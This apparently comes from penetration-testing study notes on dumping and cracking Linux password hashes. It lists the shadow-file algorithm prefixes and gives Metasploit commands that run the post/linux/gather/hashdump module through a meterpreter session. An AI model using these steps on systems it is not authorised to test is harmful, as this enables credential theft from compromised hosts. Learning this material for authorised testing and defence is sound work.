## Dumping and Cracking Linux Hashes

_The shadow file can give us a clue about the hashing algorithm tha is being use._

_$1 is MD5_

_$2 is Blowfish_

_$5 is SHA-256_

_$6 is SHA-512_

Some distributions use libxcrypt which supports and documents quite a few more methods:

y: yescrypt

gy: gost-yescrypt

7: scrypt

sha1: sha1crypt

md5: SunMD5

Other platforms support other algorithms, so check the crypt manpage there. For example, OpenBSD’s crypt(3) only supports Blowfish, which it identifies using the id “2b”.

Elevated privileges are required for duming linux hashes.

Get hashes using meterpreter session.

```plaintext
search hashdump
use post/linux/gather/hashdump
show options
set SESSION
run
```
